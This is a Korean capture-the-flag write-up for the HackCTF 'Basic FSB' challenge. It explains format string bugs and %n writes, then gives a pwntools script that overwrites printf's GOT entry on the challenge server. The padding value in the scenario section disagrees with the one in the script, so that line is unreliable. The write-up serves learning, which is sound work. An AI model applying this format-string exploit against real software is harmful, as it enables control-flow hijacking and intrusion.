---
title:  "[HackCTF] Basic FSB 풀이"
categories:
    - Pwnable
tags:
    - ctf.j0n9hyun.xyz
toc: true
published: true
---
[HackCTF] Basic FSB 풀이

# Environments

|Name|Config|
|:---:|:---|
|CPU|Apple M1|
|Architecture|ARM64|
|OS|Microsoft Windows 11 on ARM|
|Tools|- gdb-peda<br/>- Hex-Rays IDA 7.5|

# Problem
![](/assets/HCTF/basic_fsb-0.png)
```
Get Input
Print Input
```

- URL: [ctf.j0n9hyun.xyz/challenges#Basic_FSB](https://ctf.j0n9hyun.xyz/challenges#Basic_FSB)
- 요약: Format String Bug 가 존재하는 `basic_fsb`, `nc ctf.j0n9hyun.xyz 3002` 으로부터 flag 찾기

# File Format
![](/assets/HCTF/basic_fsb-1.png)

> x86 ELF LSB Executable, Not Stripped, Not UPX Packed

# checksec

|Name|Status|
|:---:|:---|
|CANARY|disabled|
|FORTIFY|disabled|
|NX|disabled|
|PIE|disabled|
|RELRO|Partial|

- Can overwrite GOT

# Theory Summary
우선 두가지를 알아야한다. Format String Bug (이하 FSB)와 GOT Overwrite 를 알아야만 이 문제를 풀 수 있는 것 같다. 이로 인하여 문제를 푸는데 상당히 오랜 시간이 걸렸다.

## Format String Bug
FSB는 `printf` 등의 Format String 을 사용하는 함수에서 User가 Format String를 조작 가능 한 경우 생기는 취약점이다. 간단한 예시를 살펴 보겠다.

```
#include <stdio.h>

int main() {
        char s[100];
        fgets(s, sizeof(s), stdin);

        printf("Normal\t\t: %s", s);
        printf("Abnormal\t: ");
        printf(s);

        return 0;
}

/*
 gcc 등으로 일반적으로 컴파일하면 보안 사항때문에 컴파일러가 먼저 차단하여 준다. 위험한 코드라고. 따라서 아래 옵션을 붙여 컴파일 해야 한다.

 -Wno-format-security -Wno-implicit-function-declaration

 Example: gcc fsb_exam.c -g -Wno-format-security -Wno-implicit-function-declaration -o fsb_exam.out
*/
```

![](/assets/HCTF/basic_fsb-3.png)

일딴 같은 결과물을 알려주긴 한다. `icaros7` 의 경우 모두 일반적인 String 이어서 문제가 없다. 그렇다면 아래는 어떨까?

![](/assets/HCTF/basic_fsb-4.png)

갑자기 지정한 적이 없는 Dummy 값이 나왔다. 보통적인 상황이라면 아마 `printf("%d", yesrs);` 등으로 출력 할 값을 지정하지만, 위 상황에서는 지정이 안되어 있어 어딘가의 메모리에 있는 Dummy 값이 표시 된 것 이다.

|Format String|설명|
|:---:|:---|
|%c|문자형 char를 출력|
|%s|문자열을 `NULL` 전까지 출력|
|%d|Signed int를 10진수로 출력|
|%u|Unsigned int를 10진수로 출력|
|%x|Unsigned Integer를 16진수로 출력|
|%n|현재까지 출력된 문자의 개수 (`\n` 포함)를 저장|

![](/assets/HCTF/basic_fsb-6.png)

Format String은 `%d` 말고도 많다. 여러가지를 시도해 보자.

그런데 사실 저 값들은 무의미 하거나 실존하지 않은 값이 나오는 것이 아니다. 메모리 Stack 의 구조에 따라 호출 되는 것이다. 예를 들어 `printf("%d + %d = %d", 1, 2, 3);` 이라는 Function Call 이 일어날 경우 아래 순서대로 Stack 에 값들이 저장된다.

1. 3
2. 2
3. 1
4. %d + %d = %d
5. ret 주소
6. 이전의 Stack Frame Pointer
7. printf method 내 변수들
8. printf()

여기서 살펴 볼 것은 **4번** 인자 기준에서 Stack의 낮은 주소 방향으로 읽어 온다는 것 입니다. 그렇다면 1~3번에 해당되는 값들을 넣지 않고 `printf("%d%d%d");`를 호출한다면 어찌 될까요? 그렇다면 1~~3번 내용에 해당되는 곳이 printf()에 관한 내용이 아니라 전혀 다른 내용이 다음에 있으면 그 친구들을 불러오는 것이다. 그 내용은 main 함수의 영역이 될 수도 있고, 다른 변수가 될 수도 있다. 그리고 그 친구들을 불러오는 것이 FSB의 **Memory Leak (메모리 유출)** 이다.

그리고 위에서 언급한 `%n` Format String 도 되짚을 필요가 있다. 아래 코드를 보면...

```
#include <stdio.h>

int main() {
        int n;
        printf("12345\n%n", &n);
        printf("n: %d\n", n);

        return 0;
}
```
![](/assets/HCTF/basic_fsb-5.png)

위와 같이 `\n`를 포함하여 현재까지 출력된 모든 문자의 개수를 n에 담아주는 것을 알 수 있다. 그렇다면 위의 Format String Bug 와 `%n` Format String을 합친다면?

우리는 원하는 위치의 Stack 에 원하는 값만큼을 넣을 수 있다. 예를 들면 위 예시 Stack에서 1번 바로 아래 `buffer` 라는 main 함수의 변수가 있었다면 `buffer`에 %n을 이용해 원하는 값을 넣을 수 있다. FSB에 대해서는 따로 Write-Up 해보기로 한다.

# Solution
![](/assets/HCTF/basic_fsb-7.png)

우선 Memory Stack 의 상태를 알기 위해 `nc ctf.j0n9hyun.xyz 3002`에 접속하여 Stack을 유추한다.

두번째 %p 에서 AAAA에 해당되는 값인 `0x41414141` 이 출력되었다. 어떠한 변수가 저장되는 곳이 Stack 의 2번째 아래라는 것이다. 그러면 `input` 값의 Format String을 통해 FSB를 이용 할 수 있다는 것이다.

![](/assets/HCTF/basic_fsb-8.png)

우선 gdb에서 `i func`를 통해 프로그램 내의 func 목록을 보면 알 수 있는 것들이 있다. `system` 함수를 호출하며, `flag`라는 함수도 보이며, 사용자가 추가 했을 확률이 높은 `vuln`이라는 함수가 존재 한다. `printf` 등의 여러 함수가 Procedure Linkage Table (PLT) 형식으로 호출되므로 GOT의 주소를 수상해보이는 `flag` 라는 함수로 고치면 될 것이라고 생각하며 진행하려 한다. (GOT Overwrite)

![](/assets/HCTF/basic_fsb-10.png)

`main` Function 을 간략적으로 살펴보자면 `setvbuf` PLT Func를 호출한 뒤 `vuln` 이라는 Func를 호출하여 모든 것을 처리 한다.

![](/assets/HCTF/basic_fsb-11.png)

`printf`, `fgets` 그리고 `snprintf`를 PLT를 통해 호출 한다. 나는 `printf` PLT 함수의 GOT를 변조하여 원하는 것을 얻을 수 있을 것 같다.

![](/assets/HCTF/basic_fsb-13.png)

`printf`가 가르키는 PLT 주소는 `0x804a00c` 이다. 이 값을 `system@plt`를 불러오는 flag 주소로 바꾸면 될 것 이다.

단, 여기서 한가지 재시도를 하였다. 바로 중요한 이미 입력된 printf@got 값을 간과 하였다. 이로 인해 flag Function 주소에서 4Byte 를 뺀 값을 덮어씌어야만 최종적으로 `0x080485b4` 로 덮어씌어 진다.

# Exploit Scenario
```
# p32: 4 Byte packing
payload = p32(0x804a00c) + "%13451096x%n"
```

# Exploit Code
```
from pwn import *
context.log_level = "DEBUG"

p = remote("ctf.j0n9hyun.xyz",3002)
payload = p32(0x804a00c) + "%134514096x%n"

p.sendline(payload)
p.interactive()
```

# Result
![](/assets/HCTF/basic_fsb-12.png)